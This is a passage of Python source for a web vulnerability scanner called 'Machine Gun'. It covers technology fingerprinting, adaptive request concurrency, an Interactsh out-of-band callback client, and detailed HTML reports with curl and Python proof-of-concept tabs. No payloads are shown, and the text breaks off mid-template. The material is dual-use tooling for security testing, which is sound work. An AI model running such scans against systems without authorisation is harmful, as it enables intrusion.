TECHNOLOGY_FINGERPRINTS = {
    "PHP": [r"X-Powered-By: PHP", r"php\.net", r"\.php"],
    "Apache": [r"Server: Apache", r"Apache/\d"],
    "Nginx": [r"Server: nginx", r"nginx/\d"],
    "IIS": [r"Server: Microsoft-IIS", r"X-AspNet-Version"],
    "Node.js": [r"X-Powered-By: Express", r"connect", r"nodejs"],
    "Python/Django": [r"Django", r"mod_wsgi", r"python"],
    "Ruby/Rails": [r"X-Powered-By: Phusion Passenger", r"Ruby on Rails"],
    "WordPress": [r"wp-content", r"wp-includes", r"WordPress"],
    "Joomla": [r"joomla"],
    "Drupal": [r"drupal"],
    "React": [r"id=\"root\"", r"data-reactroot"],
    "Angular": [r"ng-app", r"ng-version"],
    "Vue.js": [r"id=\"app\"", r"data-v-"],
    "jQuery": [r"jQuery\.fn\.jquery"],
    "Bootstrap": [r"bootstrap\.min\.css", r"bootstrap\.js"],
    "GraphQL": [r"graphql"],
    "OpenAPI/Swagger": [r"swagger-ui", r"openapi\.json"],
}

# --- Logging Setup ---
logger = logging.getLogger("MachineGun")
logger.propagate = False # Prevent duplicate logs from root logger

class ColoredFormatter(logging.Formatter):
    """Custom formatter to add colors to log messages."""
    FORMATS = {
        logging.DEBUG: AnsiColors.colorize("%(asctime)s - [%(levelname)s] - %(message)s", AnsiColors.OKCYAN),
        logging.INFO: AnsiColors.colorize("%(asctime)s - [%(levelname)s] - %(message)s", AnsiColors.OKGREEN),
        logging.WARNING: AnsiColors.colorize("%(asctime)s - [%(levelname)s] - %(message)s", AnsiColors.WARNING),
        logging.ERROR: AnsiColors.colorize("%(asctime)s - [%(levelname)s] - %(message)s", AnsiColors.FAIL),
        logging.CRITICAL: AnsiColors.colorize("%(asctime)s - [%(levelname)s] - %(message)s", AnsiColors.BOLD + AnsiColors.FAIL),
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

# --- Adaptive Concurrency Manager ---
class AdaptiveConcurrencyManager:
    """Manages concurrency dynamically based on server response."""
    def __init__(self, initial_concurrency: int, max_concurrency: int):
        self.semaphore = asyncio.Semaphore(initial_concurrency)
        self.max_concurrency = max_concurrency
        self.current_concurrency = initial_concurrency
        self.response_times: Deque[float] = deque(maxlen=200) # Increased history
        self.error_count = 0
        self.success_count = 0
        self.lock = asyncio.Lock()
        self.last_adjustment_time = time.time()
        logger.info(f"Concurrency Manager initialized: {initial_concurrency} tasks.")

    async def acquire(self):
        await self.semaphore.acquire()

    def release(self):
        self.semaphore.release()

    async def update_metrics(self, duration: float, is_error: bool):
        async with self.lock:
            if is_error:
                self.error_count += 1
            else:
                self.success_count += 1
                self.response_times.append(duration)

            # Adjust more frequently if there's an issue, otherwise less often
            # Only attempt adjustment if enough requests have accumulated to make a decision
            adjustment_interval = 5 if (self.error_count + self.success_count) % 5 == 0 else 20
            if (time.time() - self.last_adjustment_time > adjustment_interval) and (self.error_count + self.success_count) > 0:
                await self._adjust_concurrency()
                self.last_adjustment_time = time.time()

    async def _adjust_concurrency(self):
        total_requests = self.error_count + self.success_count
        if total_requests == 0:
            return

        error_rate = self.error_count / total_requests
        new_concurrency = self.current_concurrency

        # Always prioritize reducing concurrency if error rate is too high
        if error_rate > ADAPTIVE_CONCURRENCY_ERROR_THRESHOLD:
            new_concurrency = max(1, self.current_concurrency - max(1, int(self.current_concurrency * 0.2))) # Reduce by 20%
            logger.warning(f"High error rate ({error_rate:.2%}). Reducing concurrency to {new_concurrency}.")
        # Only attempt latency-based adjustments or increases if we have enough data points
        elif len(self.response_times) >= 10: # Ensure at least 10 samples for meaningful average and slice
            try:
                avg_latency = statistics.mean(self.response_times)
            except statistics.StatisticsError:
                logger.debug("StatisticsError in _adjust_concurrency, response_times might be empty or invalid. Skipping latency adjustment.")
                return # Skip adjustment if mean cannot be calculated

            # Check for latency spike
            if avg_latency > 0 and self.response_times[-1] > avg_latency * ADAPTIVE_CONCURRENCY_LATENCY_THRESHOLD_MULTIPLIER:
                new_concurrency = max(1, self.current_concurrency - max(1, int(self.current_concurrency * 0.1))) # Reduce by 10%
                logger.warning(f"Latency spike detected ({self.response_times[-1]:.2f}s vs avg {avg_latency:.2f}s). Reducing concurrency to {new_concurrency}.")
            # Check for stable performance to increase concurrency
            elif error_rate < 0.05 and all(t < avg_latency * 1.5 for t in list(self.response_times)[-10:]): # Convert to list for robust slicing
                new_concurrency = min(self.max_concurrency, self.current_concurrency + 1)
                logger.debug(f"Stable performance. Increasing concurrency to {new_concurrency}.")
        # If not enough data for advanced adjustments, and no high errors, keep current concurrency
        else:
            logger.debug(f"Not enough response times ({len(self.response_times)}) for advanced concurrency adjustment. Keeping current: {self.current_concurrency}.")


        if new_concurrency != self.current_concurrency:
            if new_concurrency > self.current_concurrency:
                # Release more tokens to increase concurrency
                for _ in range(new_concurrency - self.current_concurrency):
                    self.semaphore.release()
            # Note: Decreasing concurrency means we just don't acquire new tokens as fast.
            # The semaphore itself can't be "shrunk" directly in a thread-safe way.
            self.current_concurrency = new_concurrency
            # Reset counters after adjustment to base next decision on fresh data
            self.error_count = 0
            self.success_count = 0
            self.response_times.clear() # Clear history after adjustment


# --- Interactsh Client for OOB Interactions ---
class InteractshClient:
    """Manages Interactsh interactions for Out-of-Band (OOB) testing."""
    def __init__(self, interactsh_server: str):
        self.interactsh_server = interactsh_server.rstrip('/')
        self.client = httpx.Client(verify=False, timeout=DEFAULT_TIMEOUT) # httpx for OOB, aiohttp for main scan
        self.auth_id = str(uuid.uuid4()).replace('-', '')
        self.interactsh_url = ""
        self.secret_key = str(uuid.uuid4()).replace('-', '')
        self.polling_url = ""
        self.stop_polling = asyncio.Event()
        self.interactions: List[Dict[str, Any]] = []
        self.polling_task: Optional[asyncio.Task] = None
        
    async def register(self):
        """Registers a new Interactsh client and gets a unique domain."""
        try:
            register_url = f"{self.interactsh_server}/register"
            headers = {"Content-Type": "application/json"}
            payload = {"authid": self.auth_id, "nonce": str(uuid.uuid4()).replace('-', ''), "secret": self.secret_key}
            
            # Use httpx for sync registration, as aiohttp is for main scan
            response = self.client.post(register_url, json=payload, headers=headers)
            response.raise_for_status()
            
            data = response.json()
            self.interactsh_url = data.get("url")
            self.polling_url = f"{self.interactsh_server}/poll"
            
            if self.interactsh_url:
                logger.info(AnsiColors.colorize(f"Interactsh client registered. OOB Domain: {self.interactsh_url}", AnsiColors.OKGREEN))
                self.polling_task = asyncio.create_task(self._poll_for_interactions())
                return True
            else:
                logger.error(f"Failed to get Interactsh URL from registration: {data}")
                return False
        except httpx.HTTPStatusError as e:
            logger.error(f"Interactsh registration HTTP error: {e.response.status_code} - {e.response.text}")
            return False
        except httpx.RequestError as e:
            logger.error(f"Interactsh registration request error: {e}")
            return False
        except Exception as e:
            logger.critical(f"Unhandled error during Interactsh registration: {e}")
            return False

    async def _poll_for_interactions(self):
        """Periodically polls the Interactsh server for interactions."""
        logger.info(f"Starting Interactsh polling every {INTERACTSH_POLLING_INTERVAL} seconds...")
        while not self.stop_polling.is_set():
            try:
                headers = {"Content-Type": "application/json"}
                payload = {"authid": self.auth_id, "secret": self.secret_key}
                
                # Use httpx for sync polling
                response = self.client.post(self.polling_url, json=payload, headers=headers)
                response.raise_for_status()
                
                data = response.json()
                if data.get("interactions"):
                    decoded_interactions = self._decode_interactions(data["interactions"])
                    for interaction in decoded_interactions:
                        self.interactions.append(interaction)
                        logger.info(AnsiColors.colorize(f"OOB Interaction received from {interaction.get('protocol')} at {interaction.get('full_id')}", AnsiColors.WARNING))
                
            except httpx.HTTPStatusError as e:
                logger.error(f"Interactsh polling HTTP error: {e.response.status_code} - {e.response.text}")
            except httpx.RequestError as e:
                logger.error(f"Interactsh polling request error: {e}")
            except Exception as e:
                logger.critical(f"Unhandled error during Interactsh polling: {e}")
            
            await asyncio.sleep(INTERACTSH_POLLING_INTERVAL)
        logger.info("Interactsh polling stopped.")

    def _decode_interactions(self, encoded_interactions: List[str]) -> List[Dict[str, Any]]:
        """Decodes base64-encoded Interactsh interactions."""
        decoded_list = []
        for encoded in encoded_interactions:
            try:
                decoded_data = base64.b64decode(encoded).decode('utf-8', errors='ignore')
                # Interactsh interactions are typically JSON strings after base64 decode
                decoded_list.append(json.loads(decoded_data))
            except (base64.binascii.Error, json.JSONDecodeError) as e:
                logger.warning(f"Failed to decode or parse Interactsh interaction: {e} - {encoded[:50]}...")
        return decoded_list

    def get_oob_payload(self, base_payload: str) -> str:
        """Replaces {{INTERACTSH_DOMAIN}} placeholder in a payload."""
        if not self.interactsh_url:
            logger.warning("Interactsh client not registered. OOB payloads will not work.")
            return base_payload # Return original if no domain
        return base_payload.replace("{{INTERACTSH_DOMAIN}}", self.interactsh_url)

    def check_for_interaction(self, unique_id: str, timeout: int = 5) -> Optional[Dict[str, Any]]:
        """Checks if a specific interaction (by unique_id) has occurred."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            for interaction in self.interactions:
                if unique_id in interaction.get('full_id', '') or unique_id in interaction.get('raw_request', ''):
                    return interaction
            time.sleep(0.5) # Wait a bit before re-checking
        return None

    async def close(self):
        """Stops polling and cleans up."""
        if self.polling_task:
            self.stop_polling.set()
            self.polling_task.cancel()
            try:
                await self.polling_task
            except asyncio.CancelledError:
                pass
        if self.client:
            self.client.close()
        logger.info("Interactsh client closed.")
# --- Report Storage & Management (Machine Gun Edition) ---
class ScanReport:
    """
    Manages and stores all findings, errors, and scan-related data for the Machine Gun Edition.
    Provides methods for adding findings, errors, and generating highly detailed,
    interactive HTML reports with comprehensive PoC data and step-by-step reproduction.
    """
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.report_id = str(uuid.uuid4())
        self.start_time = time.time()
        self.findings: List[Dict[str, Any]] = []
        self.errors: List[str] = []
        self.crawled_urls: Set[str] = set()
        self.queued_or_processed_urls: Set[str] = set() # For crawler tracking
        self.js_files_found: Set[str] = set()
        self.parameters_discovered: Dict[str, List[Dict[str, Any]]] = {} # {url: [{name: 'param', source: 'form', method: 'GET', value: 'sample'}, ...]}
        self.api_endpoints_discovered: Set[str] = set() # New: To store discovered API endpoints
        self.detected_technologies: Set[str] = set()
        self.anti_csrf_tokens: Dict[str, str] = {} # {url: token}
        self.scan_profile_used: str = "N/A"
        self.cli_args_used: Optional[argparse.Namespace] = None
        self.response_hashes: Dict[str, str] = {} # {content_hash: url} for deduplication
        self.baseline_profiles: Dict[str, Dict[str, Any]] = {} # {url: {mean_time, stdev_time, mean_length, stdev_length, common_statuses, structural_hashes}}
        self.browser_pages_scanned: Set[str] = set() # To track URLs scanned by Playwright
        self.session_cookies: Dict[str, str] = {} # To store cookies from login/session
        self.session_headers: Dict[str, str] = {} # To store headers from login/session
        self.sensitive_client_storage_data: List[Dict[str, Any]] = [] # New: For local/session storage findings

    def add_finding(self, title: str, description: str, severity: str, confidence: str,
                    evidence: str, remediation: str, affected_url: str,
                    parameter: Optional[str] = None, request_details: Optional[str] = None,
                    response_details: Optional[str] = None, poc_notes: Optional[str] = None,
                    curl_poc: Optional[str] = None, python_poc: Optional[str] = None,
                    oob_interaction: Optional[Dict[str, Any]] = None,
                    poc_steps: Optional[List[str]] = None,
                    remediation_steps: Optional[List[str]] = None,
                    screenshot_path: Optional[str] = None
                    ):
        """Adds a new vulnerability finding to the report, with consolidation."""
        finding_id = str(uuid.uuid4())
        cwe_id = CWE_MAPPING.get(title.split('(')[0].strip(), "N/A") # Clean title for mapping
        owasp_cat = OWASP_TOP_10_2021_MAPPING.get(cwe_id, "N/A")

        # Consolidation logic: Use a group key to prevent duplicate findings for the same vulnerability on the same parameter/URL
        group_key = f"{title}-{affected_url}-{parameter}" if parameter else f"{title}-{affected_url}"
        for existing_finding in self.findings:
            if existing_finding.get("group_key") == group_key and existing_finding["title"] == title:
                logger.debug(f"Consolidating finding for '{title}' on '{affected_url}'")
                # Optionally append new evidence/notes if different
                if poc_notes and poc_notes not in existing_finding.get("poc_notes", ""):
                    existing_finding["poc_notes"] += f"\n\n--- Additional Evidence ---\n{poc_notes}"
                # Update PoC steps if more detailed ones are provided
                if poc_steps and (not existing_finding.get("poc_steps") or len(poc_steps) > len(existing_finding["poc_steps"])):
                    existing_finding["poc_steps"] = poc_steps
                if remediation_steps and (not existing_finding.get("remediation_steps") or len(remediation_steps) > len(existing_finding["remediation_steps"])):
                    existing_finding["remediation_steps"] = remediation_steps
                # Update screenshot if a new one is available
                if screenshot_path and not existing_finding.get("screenshot_path"):
                    existing_finding["screenshot_path"] = screenshot_path
                return

        finding = {
            "id": finding_id, "title": title, "description": description,
            "severity": severity, "confidence": confidence, "evidence": evidence,
            "remediation": remediation, "affected_url": affected_url,
            "parameter": parameter, "cwe": cwe_id, "owasp": owasp_cat,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "group_key": group_key,
            "poc_notes": poc_notes or "N/A",
            "curl_poc": curl_poc or "N/A",
            "python_poc": python_poc or "N/A",
            "request_details": request_details or "N/A",
            "response_details": response_details or "N/A",
            "oob_interaction": oob_interaction or "N/A",
            "poc_steps": poc_steps or [], # Initialize as empty list
            "remediation_steps": remediation_steps or [], # Initialize as empty list
            "screenshot_path": screenshot_path or "N/A",
        }
        self.findings.append(finding)
        msg = f"[{severity.upper()}/{confidence.upper()}] {title} @ {affected_url}" + \
        (f" (Param: {parameter})" if parameter else "") + \
        (f" [OOB: {oob_interaction.get('protocol', 'N/A')}]" if oob_interaction else "")
        log_color = {"Critical": AnsiColors.FAIL, "High": AnsiColors.FAIL, "Medium": AnsiColors.WARNING, "Low": AnsiColors.OKBLUE, "Informational": AnsiColors.OKCYAN}.get(severity, AnsiColors.OKBLUE)
        logger.warning(AnsiColors.colorize(msg, log_color)) # Use warning level to make it stand out

    def add_error(self, message: str, url: Optional[str] = None, check_name: Optional[str] = None):
        """Adds an error message to the report."""
        err_msg = f"Check '{check_name}': {message} (URL: {url})" if check_name and url else f"{message}"
        self.errors.append(err_msg)
        logger.error(err_msg)

    def generate_html_report(self) -> str:
        """Generates a comprehensive, interactive, self-contained HTML report."""
        end_time = time.time()
        duration = round(end_time - self.start_time, 2)
        severity_counts = Counter(f['severity'] for f in self.findings)
        
        # Sort findings by severity (Critical > High > Medium > Low > Informational) and then confidence
        severity_order = ["Critical", "High", "Medium", "Low", "Informational"]
        confidence_order = ["Confirmed", "Firm", "Probable", "Tentative", "N/A"]
        sorted_findings = sorted(self.findings, key=lambda x: (
            severity_order.index(x.get('severity', 'Informational')),
            confidence_order.index(x.get('confidence', 'N/A'))
        ))

        findings_html = []
        for finding in sorted_findings:
            oob_html = ""
            if finding['oob_interaction'] != "N/A":
                oob_html = f"""
                <h5>OOB Interaction Details:</h5>
                <pre class="oob-details"><code>{escape(json.dumps(finding['oob_interaction'], indent=2))}</code></pre>
                """
            
            poc_steps_html = ""
            if finding['poc_steps']:
                poc_steps_html = "<h5>Step-by-Step Reproduction:</h5><ol>" + \
                                 "\n".join([f"<li>{escape(step)}</li>" for step in finding['poc_steps']]) + \
                                 "</ol>"
            
            remediation_steps_html = ""
            if finding['remediation_steps']:
                remediation_steps_html = "<h5>Detailed Remediation Steps:</h5><ol>" + \
                                         "\n".join([f"<li>{escape(step)}</li>" for step in finding['remediation_steps']]) + \
                                         "</ol>"

            screenshot_html = ""
            if finding['screenshot_path'] != "N/A":
                # Assuming screenshots are saved relative to the report or in a subdirectory
                # For a self-contained report, we'd embed them as base64, but for now, link to file.
                screenshot_html = f"""
                <h5>Screenshot:</h5>
                <a href="{escape(os.path.basename(finding['screenshot_path']))}" target="_blank">
                    <img src="{escape(os.path.basename(finding['screenshot_path']))}" alt="Proof of Concept Screenshot" style="max-width: 100%; height: auto; border-radius: 8px; border: 1px solid var(--border-color);">
                </a>
                <p class="text-light">Click image to view full size.</p>
                """

            findings_html.append(f"""
            <div class="finding severity-{finding['severity'].lower()}" data-severity="{finding['severity']}" data-search-terms="{escape(finding['title'].lower())} {escape(finding['affected_url'].lower())} {escape(str(finding['parameter']).lower())}">
                <div class="finding-header" onclick="toggleVisibility('details-{finding['id']}')">
                    <span class="severity-tag">{escape(finding['severity'])}</span>
                    <span class="confidence-tag confidence-{finding['confidence'].lower()}">{escape(finding['confidence'])}</span>
                    <h3>{escape(finding['title'])}</h3>
                    <span class="affected-url" title="{escape(finding['affected_url'])}">{escape(finding['affected_url'])}</span>
                    <span class="toggle-icon">&#9660;</span>
                </div>
                <div class="finding-details" id="details-{finding['id']}">
                    <p><strong>Description:</strong> {escape(finding['description'])}</p>
                    <p><strong>CWE:</strong> {escape(finding['cwe'])} | <strong>OWASP:</strong> {escape(finding['owasp'])}</p>
                    <p><strong>Parameter:</strong> {escape(str(finding['parameter'])) if finding['parameter'] else 'N/A'}</p>
                    <p><strong>Evidence:</strong> <pre class="evidence-code">{escape(str(finding['evidence']))}</pre></p>
                    <p><strong>Remediation:</strong> {escape(finding['remediation'])}</p>
                    {remediation_steps_html}
                    
                    <h4>Proof of Concept (PoC)</h4>
                    {poc_steps_html}
                    {screenshot_html}
                    <div class="poc-tabs">
                        <button class="tab-link active" onclick="openPocTab(event, 'poc-manual-{finding['id']}')">Manual/Notes</button>
                        <button class="tab-link" onclick="openPocTab(event, 'poc-curl-{finding['id']}')">Curl</button>
                        <button class="tab-link" onclick="openPocTab(event, 'poc-python-{finding['id']}')">Python</button>
                        <button class="tab-link" onclick="openPocTab(event, 'poc-raw-{finding['id']}')">Raw Data</button>
                    </div>

                    <div id="poc-manual-{finding['id']}" class="tab-content" style="display: block;">
                        <h5>Additional PoC Notes:</h5>
                        <pre class="poc-notes">{escape(finding['poc_notes'])}</pre>
                    </div>
                    <div id="poc-curl-{finding['id']}" class="tab-content">
                        <h5>Curl Command <button class="copy-btn" onclick="copyToClipboard(this, 'curl-code-{finding['id']}')">Copy</button></h5>
                        <pre id="curl-code-{finding['id']}"><code>{escape(finding['curl_poc'])}</code></pre>
                    </div>
                    <div id="poc-python-{finding['id']}" class="tab-content">
                        <h5>Python (aiohttp) <button class="copy-btn" onclick="copyToClipboard(this, 'python-code-{finding['id']}')">Copy</button></h5>
                        <pre id="python-code-{finding['id']}"><code>{escape(finding['python_poc'])}</code></pre>
                    </div>
                    <div id="poc-raw-{finding['id']}" class="tab-content">
                        <h5>Raw Request <button class="copy-btn" onclick="copyToClipboard(this, 'request-code-{finding['id']}')">Copy</button></h5>
                        <pre id="request-code-{finding['id']}"><code>{escape(finding['request_details'])}</code></pre>
                        <h5>Raw Response <button class="copy-btn" onclick="copyToClipboard(this, 'response-code-{finding['id']}')">Copy</button></h5>
                        <pre id="response-code-{finding['id']}"><code>{escape(finding['response_details'])}</code></pre>
                    </div>
                    {oob_html}
                </div>
            </div>
            """)

        # Generate HTML for Crawled URLs
        crawled_urls_html = "\n".join([f"<li><a href='{escape(url)}' target='_blank'>{escape(url)}</a></li>" for url in sorted(list(self.crawled_urls))])
        if not crawled_urls_html: crawled_urls_html = "<li>No URLs crawled.</li>"

        # Generate HTML for Discovered Parameters
        params_html = []
        for url, params_list in self.parameters_discovered.items():
            if params_list:
                params_html.append(f"<h4>{escape(url)}</h4><ul>")
                for p in params_list:
                    params_html.append(f"<li><strong>Name:</strong> {escape(p['name'])} (Source: {escape(p.get('source', 'N/A'))}, Method: {escape(p.get('method', 'N/A'))}, Value: {escape(p.get('value', ''))})</li>")
                params_html.append("</ul>")
        if not params_html: params_html = ["<p>No parameters discovered.</p>"]

        # Generate HTML for Discovered API Endpoints
        api_endpoints_html = "\n".join([f"<li><a href='{escape(url)}' target='_blank'>{escape(url)}</a></li>" for url in sorted(list(self.api_endpoints_discovered))])
        if not api_endpoints_html: api_endpoints_html = "<li>No API endpoints discovered.</li>"

        # Generate HTML for JS Files Found
        js_files_html = "\n".join([f"<li><a href='{escape(url)}' target='_blank'>{escape(url)}</a></li>" for url in sorted(list(self.js_files_found))])
        if not js_files_html: js_files_html = "<li>No JavaScript files found.</li>"

        # Generate HTML for Sensitive Client Storage Data
        sensitive_storage_html = []
        if self.sensitive_client_storage_data:
            for item in self.sensitive_client_storage_data:
                sensitive_storage_html.append(f"<li><strong>URL:</strong> {escape(item['url'])}<br><strong>Location:</strong> {escape(item['location'])}<br><strong>Key:</strong> {escape(item['key'])}<br><strong>Value:</strong> <pre>{escape(item['value'])}</pre></li>")
        if not sensitive_storage_html: sensitive_storage_html = ["<li>No sensitive data found in client-side storage.</li>"]


        # Generate HTML for Detected Technologies
        tech_html = "\n".join([f"<li>{escape(tech)}</li>" for tech in sorted(list(self.detected_technologies))])
        if not tech_html: tech_html = "<li>No technologies detected.</li>"

        # Generate HTML for Errors
        errors_html = "\n".join([f"<li><pre>{escape(err)}</pre></li>" for err in self.errors])
        if not errors_html: errors_html = "<li>No errors reported during scan.</li>"

        html = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Machine Gun Scan Report - {escape(self.target_url)}</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
            <style>
                :root {{
                    --bg-main: #0F172A; /* Slate 900 */
                    --bg-card: #1E293B; /* Slate 800 */
                    --bg-header: #0F172A;
                    --text-main: #E2E8F0; /* Slate 200 */
                    --text-light: #94A3B8; /* Slate 400 */
                    --text-title: #F8FAFC; /* Slate 50 */
                    --border-color: #334155; /* Slate 700 */
                    --accent-color: #3B82F6; /* Blue 500 */
                    --accent-hover: #2563EB; /* Blue 600 */
                    --critical: #EF4444; /* Red 500 */
                    --high: #F97316; /* Orange 500 */
                    --medium: #F59E0B; /* Amber 500 */
                    --low: #22C55E; /* Green 500 */
                    --info: #64748B; /* Slate 500 */
                    --code-bg: #111827; /* Darker Slate */
                }}
                body {{ font-family: 'Inter', sans-serif; margin: 0; padding: 0; background-color: var(--bg-main); color: var(--text-main); font-size: 16px; line-height: 1.6; }}
                .container {{ max-width: 1600px; margin: 30px auto; padding: 0 20px; }}
                .header {{ background: var(--bg-header); color: var(--text-title); padding: 40px 20px; text-align: center; border-bottom: 4px solid var(--accent-color); }}
                .header h1 {{ margin: 0; font-size: 2.8em; font-weight: 300; letter-spacing: 1px; }}
                .header .version {{ font-size: 0.6em; opacity: 0.7; display: block; margin-top: 5px; }}
                .header .subtitle {{ font-size: 0.8em; opacity: 0.6; display: block; margin-top: 5px; }} /* Added subtitle style */
                .header p {{ margin: 8px 0 0; font-size: 1.1em; opacity: 0.9; word-break: break-all; }}
                section {{ margin-bottom: 30px; background-color: var(--bg-card); border-radius: 12px; border: 1px solid var(--border-color); overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }}
                .section-header {{ padding: 20px 25px; background-color: rgba(0,0,0,0.1); border-bottom: 1px solid var(--border-color); }}
                .section-header h2 {{ margin: 0; color: var(--text-title); font-size: 1.8em; font-weight: 500; }}
                .section-content {{ padding: 25px; }}
                .summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 20px; }}
                .summary-card {{ background-color: var(--code-bg); padding: 20px; border-radius: 8px; text-align: center; border-left: 5px solid; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }}
                .summary-card h4 {{ margin: 0 0 10px 0; color: var(--text-light); font-size: 1.1em; text-transform: uppercase; letter-spacing: 0.5px; }}
                .summary-card p {{ margin: 0; font-size: 2.5em; font-weight: 700; color: var(--text-title); }}
                .summary-card.critical {{ border-color: var(--critical); }} .summary-card.critical p {{ color: var(--critical); }}
                .summary-card.high {{ border-color: var(--high); }} .summary-card.high p {{ color: var(--high); }}
                .summary-card.medium {{ border-color: var(--medium); }} .summary-card.medium p {{ color: var(--medium); }}
                .summary-card.low {{ border-color: var(--low); }} .summary-card.low p {{ color: var(--low); }}
                .summary-card.informational {{ border-color: var(--info); }} .summary-card.informational p {{ color: var(--info); }}
                #chart-container {{ height: 250px; margin-top: 20px; }}
                .finding {{ background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 15px; overflow: hidden; transition: box-shadow 0.2s ease, transform 0.2s ease; }}
                .finding:hover {{ box-shadow: 0 0 15px rgba(59, 130, 246, 0.3); transform: translateY(-3px); }}
                .finding-header {{ padding: 15px 20px; background-color: rgba(255,255,255,0.03); cursor: pointer; display: flex; align-items: center; gap: 15px; border-radius: 8px 8px 0 0; }}
                .finding-header h3 {{ margin: 0; flex-grow: 1; font-size: 1.2em; color: var(--text-title); }}
                .severity-tag {{ padding: 5px 10px; border-radius: 15px; font-size: 0.8em; font-weight: bold; color: white; }}
                .finding.severity-critical .severity-tag {{ background-color: var(--critical); }}
                .finding.severity-high .severity-tag {{ background-color: var(--high); }}
                .finding.severity-medium .severity-tag {{ background-color: var(--medium); }}
                .finding.severity-low .severity-tag {{ background-color: var(--low); }}
                .finding.severity-informational .severity-tag {{ background-color: var(--info); }}
                .confidence-tag {{ background-color: var(--border-color); color: var(--text-light); padding: 4px 8px; border-radius: 5px; font-size: 0.75em; }}
                .affected-url {{ font-family: monospace; font-size: 0.9em; color: var(--text-light); max-width: 40%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
                .toggle-icon {{ margin-left: auto; transition: transform 0.3s ease; font-size: 1.5em; }}
                .finding-details {{ padding: 0 25px 25px 25px; display: none; }}
                .finding-details p, .finding-details ol {{ margin: 15px 0; }}
                .finding-details ol li {{ margin-bottom: 5px; }}
                pre, code {{ background-color: var(--code-bg); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', 'Courier New', Courier, monospace; font-size: 0.9em; line-height: 1.4; white-space: pre-wrap; word-break: break-all; border: 1px solid var(--border-color); color: var(--text-main); }}
                .evidence-code {{ color: var(--high); font-weight: bold; }}
                .poc-tabs {{ overflow: hidden; border-bottom: 1px solid var(--border-color); margin-bottom: 20px; display: flex; }}
                .tab-link {{ background-color: transparent; border: none; outline: none; cursor: pointer; padding: 14px 16px; transition: 0.3s; font-size: 1em; color: var(--text-light); border-bottom: 3px solid transparent; }}
                .tab-link:hover {{ color: var(--text-title); }}
                .tab-link.active {{ color: var(--accent-color); border-bottom: 3px solid var(--accent-color); }}
                .tab-content {{ display: none; }}
                .copy-btn {{ float: right; padding: 5px 10px; background-color: var(--accent-color); color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 0.8em; transition: background-color 0.2s; }}
                .copy-btn:hover {{ background-color: var(--accent-hover); }}
                .controls {{ display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 20px; align-items: center; }}
                #filterInput {{ flex-grow: 1; min-width: 200px; padding: 12px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 1em; background-color: var(--code-bg); color: var(--text-main); }}
                .filter-buttons {{ display: flex; flex-wrap: wrap; gap: 10px; }}
                .filter-buttons button {{ padding: 10px 18px; background-color: var(--border-color); color: var(--text-light); border: none; border-radius: 5px; cursor: pointer; font-size: 0.9em; transition: background-color 0.2s; }}
                .filter-buttons button.active {{ background-color: var(--accent-color); color: var(--text-title); font-weight: bold; }}
                ul.info-list {{ list-style-type: none; padding: 0; }}
                ul.info-list li {{ background: rgba(0,0,0,0.1); margin-bottom: 8px; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; border: 1px solid var(--border-color); }}
                .disclaimer {{ background-color: var(--critical); color: white; padding: 20px; border-radius: 8px; margin-top: 30px; text-align: center; font-weight: bold; }}
                .disclaimer p {{ margin: 0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Machine Gun <span class="version">v1.0</span></h1>
                <span class="subtitle">by out_of_face</span>
                <p>Target: {escape(self.target_url)}</p>
                <p>Scan ID: {escape(self.report_id)}</p>
            </div>
            <div class="container">
                <section>
                    <div class="section-header"><h2>Executive Summary</h2></div>
                    <div class="section-content">
                        <p>Scan completed in <strong>{duration} seconds</strong> (started: {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.start_time))}).</p>
                        <p>Found <strong>{len(self.findings)} unique vulnerabilities</strong> across {len(self.crawled_urls)} unique URLs.</p>
                        <div class="summary-grid">
                            <div class="summary-card critical"><h4>Critical</h4><p>{severity_counts.get('Critical', 0)}</p></div>
                            <div class="summary-card high"><h4>High</h4><p>{severity_counts.get('High', 0)}</p></div>
                            <div class="summary-card medium"><h4>Medium</h4><p>{severity_counts.get('Medium', 0)}</p></div>
                            <div class="summary-card low"><h4>Low</h4><p>{severity_counts.get('Low', 0)}</p></div>
                            <div class="summary-card informational"><h4>Informational</h4><p>{severity_counts.get('Informational', 0)}</p></div>
                        </div>
                        <div id="chart-container">
                            <canvas id="severityChart"></canvas>
                        </div>
                        <p style="margin-top: 20px;">Scan Profile Used: <strong>{escape(self.scan_profile_used)}</strong></p>
                        <p>CLI Arguments: <code>{escape(str(self.cli_args_used))}</code></p>
                    </div>
                </section>
                <section>
                    <div class="section-header"><h2>Vulnerability Findings ({len(self.findings)})</h2></div>
                    <div class="section-content">
                        <div class="controls">
                            <input type="text" id="filterInput" onkeyup="filterFindings()" placeholder="Search findings by title, URL, or parameter...">
                            <div class="filter-buttons">
                                <button class="active" onclick="filterSeverity('All', this)">All</button>
                                <button onclick="filterSeverity('Critical', this)">Critical</button>
                                <button onclick="filterSeverity('High', this)">High</button>
                                <button onclick="filterSeverity('Medium', this)">Medium</button>
                                <button onclick="filterSeverity('Low', this)">Low</button>
                                <button onclick="filterSeverity('Informational', this)">Informational</button>
                            </div>
                        </div>
                        <div id="findingsList">
                            {''.join(findings_html) if findings_html else '<p>No vulnerabilities found during the scan. Great job!</p>'}
                        </div>
                    </div>
                </section>
                <section>
                    <div class="section-header"><h2>Scan Details</h2></div>
                    <div class="section-content">
